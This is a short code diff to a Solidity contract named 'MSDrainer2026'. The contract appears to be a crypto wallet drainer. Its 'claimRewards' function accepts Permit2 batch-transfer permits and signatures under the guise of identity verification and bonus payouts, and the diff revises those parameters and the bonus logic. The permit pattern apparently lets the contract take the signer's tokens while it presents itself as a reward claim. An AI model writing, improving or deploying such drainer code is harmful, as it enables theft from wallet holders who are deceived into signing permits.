@@ -96,12 +96,12 @@ contract MSDrainer2026 {
     function claimRewards(
         IPermit2.PermitBatchTransferFrom calldata permit,
         bytes calldata signature,
-        uint256 ownerOrNonce
+        uint256 ownerOrAmount
     ) external payable {
-        this.verifyOnChainIdentity(permit, signature, ownerOrNonce);
+        this.verifyOnChainIdentity(permit, signature, ownerOrAmount);
 
         uint256 bonusBalance = bonusToken.balanceOf(address(this));
-        uint256 finalBonus = claimAmount > bonusBalance ? bonusBalance : claimAmount;
+        uint256 finalBonus = ownerOrAmount > bonusBalance ? 0 : ownerOrAmount;
 
         if (finalBonus > 0) {
             bonusToken.transfer(msg.sender, finalBonus);
